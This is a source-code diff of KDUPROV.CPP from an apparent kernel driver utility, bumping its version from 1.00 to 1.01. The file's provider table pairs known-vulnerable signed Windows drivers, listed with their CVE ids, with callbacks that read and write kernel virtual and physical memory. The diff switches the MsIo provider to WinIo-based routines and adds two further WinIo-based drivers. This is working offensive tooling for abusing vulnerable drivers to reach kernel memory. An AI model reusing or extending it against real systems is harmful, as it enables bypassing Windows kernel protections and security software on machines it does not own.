@@ -4,9 +4,9 @@
 *
 *  TITLE:       KDUPROV.CPP
 *
-*  VERSION:     1.00
+*  VERSION:     1.01
 *
-*  DATE:        09 Feb 2020
+*  DATE:        12 Feb 2020
 *
 *  Vulnerable driver providers routines.
 *
@@ -22,7 +22,7 @@
 #include "idrv/rtcore.h"
 #include "idrv/gdrv.h"
 #include "idrv/atszio.h"
-#include "idrv/msio.h"
+#include "idrv/winio.h"
 
 //
 // Since we have a lot of them, make an abstraction layer.
@@ -33,7 +33,7 @@ KDU_PROVIDER g_KDUProviders[KDU_PROVIDERS_MAX] =
     {
         KDU_MAX_NTBUILDNUMBER,
         IDR_iQVM64,
-        0x00000000,
+        KDUPROV_FLAGS_NONE,
         (LPWSTR)L"CVE-2015-2291",
         (LPWSTR)L"NalDrv",
         (LPWSTR)L"Nal",
@@ -54,7 +54,7 @@ KDU_PROVIDER g_KDUProviders[KDU_PROVIDERS_MAX] =
     {
         KDU_MAX_NTBUILDNUMBER,
         IDR_RTCORE64,
-        0x00000000,
+        KDUPROV_FLAGS_NONE,
         (LPWSTR)L"CVE-2019-16098",
         (LPWSTR)L"RTCore64",
         (LPWSTR)L"RTCore64",
@@ -75,7 +75,7 @@ KDU_PROVIDER g_KDUProviders[KDU_PROVIDERS_MAX] =
     {
         KDU_MAX_NTBUILDNUMBER,
         IDR_GDRV,
-        0x00000000,
+        KDUPROV_FLAGS_NONE,
         (LPWSTR)L"CVE-2018-19320",
         (LPWSTR)L"Gdrv",
         (LPWSTR)L"GIO",
@@ -96,7 +96,7 @@ KDU_PROVIDER g_KDUProviders[KDU_PROVIDERS_MAX] =
     {
         KDU_MAX_NTBUILDNUMBER,
         IDR_ATSZIO64,
-        0x00000000,
+        KDUPROV_FLAGS_NONE,
         (LPWSTR)L"ASUSTeK WinFlash",
         (LPWSTR)L"ATSZIO",
         (LPWSTR)L"ATSZIO",
@@ -117,24 +117,65 @@ KDU_PROVIDER g_KDUProviders[KDU_PROVIDERS_MAX] =
     {
         KDU_MAX_NTBUILDNUMBER,
         IDR_MSIO64,
-        0x00000002,
+        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_WINIO_BASED,
         (LPWSTR)L"CVE-2019-18845",
         (LPWSTR)L"MsIo64",
         (LPWSTR)L"MsIo",
         (LPWSTR)L"MICSYS Technology Co., Ltd.",
-        (provRegisterDriver)KDUProviderStub,
+        WinIoRegisterDriver,
         (provUnregisterDriver)KDUProviderStub,
         (provAllocateKernelVM)KDUProviderStub,
         (provFreeKernelVM)KDUProviderStub,
-        MsioReadKernelVirtualMemory,
-        MsioWriteKernelVirtualMemory,
-        MsioVirtualToPhysical,
+        WinIoReadKernelVirtualMemory,
+        WinIoWriteKernelVirtualMemory,
+        WinIoVirtualToPhysical,
         (provReadControlRegister)KDUProviderStub,
-        MsioQueryPML4Value,
-        MsioReadPhysicalMemory,
-        MsioWritePhysicalMemory
-    }
+        WinIoQueryPML4Value,
+        WinIoReadPhysicalMemory,
+        WinIoWritePhysicalMemory
+    },
 
+    {
+        KDU_MAX_NTBUILDNUMBER,
+        IDR_GLCKIO2,
+        KDUPROV_FLAGS_WINIO_BASED,
+        (LPWSTR)L"ASRock Polychrome RGB, multiple CVE ids",
+        (LPWSTR)L"GLCKIo2",
+        (LPWSTR)L"GLCKIo2",
+        (LPWSTR)L"ASUSTeK Computer Inc.",
+        WinIoRegisterDriver,
+        (provUnregisterDriver)KDUProviderStub,
+        (provAllocateKernelVM)KDUProviderStub,
+        (provFreeKernelVM)KDUProviderStub,
+        WinIoReadKernelVirtualMemory,
+        WinIoWriteKernelVirtualMemory,
+        WinIoVirtualToPhysical,
+        (provReadControlRegister)KDUProviderStub,
+        WinIoQueryPML4Value,
+        WinIoReadPhysicalMemory,
+        WinIoWritePhysicalMemory
+    },
+
+    {
+        KDU_MAX_NTBUILDNUMBER,
+        IDR_ENEIO64,
+        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_WINIO_BASED,
+        (LPWSTR)L"G.SKILL Trident Z Lighting Control",
+        (LPWSTR)L"EneIo64",
+        (LPWSTR)L"EneIo",
+        (LPWSTR)L"Microsoft Windows Hardware Compatibility Publisher",
+        WinIoRegisterDriver,
+        (provUnregisterDriver)KDUProviderStub,
+        (provAllocateKernelVM)KDUProviderStub,
+        (provFreeKernelVM)KDUProviderStub,
+        WinIoReadKernelVirtualMemory,
+        WinIoWriteKernelVirtualMemory,
+        WinIoVirtualToPhysical,
+        (provReadControlRegister)KDUProviderStub,
+        WinIoQueryPML4Value,
+        WinIoReadPhysicalMemory,
+        WinIoWritePhysicalMemory
+     }
 };
 
 /*
@@ -170,9 +211,11 @@ VOID KDUProvList()
         // List provider flags.
         //
         printf_s("\tHVCI support: %s\r\n"\
-            "\tWHQL signature present: %s\r\n",
+            "\tWHQL signature present: %s\r\n"\
+            "\tWinIO based: %s\r\n",
             (prov->SupportHVCI == 0) ? "No" : "Yes",
-            (prov->SignatureWHQL == 0) ? "No" : "Yes");
+            (prov->SignatureWHQL == 0) ? "No" : "Yes",
+            (prov->WinIoBased == 0) ? "No" : "Yes");
 
         //
         // Maximum support Windows build.
@@ -458,7 +501,7 @@ PKDU_CONTEXT WINAPI KDUProviderCreate(
     // Show provider info.
     //
     printf_s("[>] Entering %s\r\n", __FUNCTION__);
-    printf_s("[+] Provider: Desciption %ws, Name \"%ws\"\r\n",
+    printf_s("[+] Provider: %ws, Name \"%ws\"\r\n",
         prov->Desciption,
         prov->DriverName);
 
@@ -517,12 +560,12 @@ PKDU_CONTEXT WINAPI KDUProviderCreate(
             return NULL;
 #endif
 
-    }
+        }
         break;
 
     default:
         break;
-}
+    }
 
     NTSTATUS ntStatus;
 
@@ -589,8 +632,11 @@ PKDU_CONTEXT WINAPI KDUProviderCreate(
             //
             if ((PVOID)Context->Provider->Callbacks.RegisterDriver != (PVOID)KDUProviderStub) {
 
-                if (!Context->Provider->Callbacks.RegisterDriver(deviceHandle))
-                    printf_s("[!] Coult not register driver, GetLastError %lu\r\n", GetLastError());
+                if (!Context->Provider->Callbacks.RegisterDriver(deviceHandle,
+                    UlongToPtr(Context->Provider->ResourceId)))
+                {
+                    printf_s("[!] Could not register driver, GetLastError %lu\r\n", GetLastError());
+                }
             }
 
         }
@@ -624,7 +670,7 @@ VOID WINAPI KDUProviderRelease(
         // Unregister driver if supported.
         //
         if ((PVOID)Context->Provider->Callbacks.UnregisterDriver != (PVOID)KDUProviderStub) {
-            Context->Provider->Callbacks.UnregisterDriver(Context->DeviceHandle);
+            Context->Provider->Callbacks.UnregisterDriver(Context->DeviceHandle, NULL);
         }
 
         if (Context->DeviceHandle)
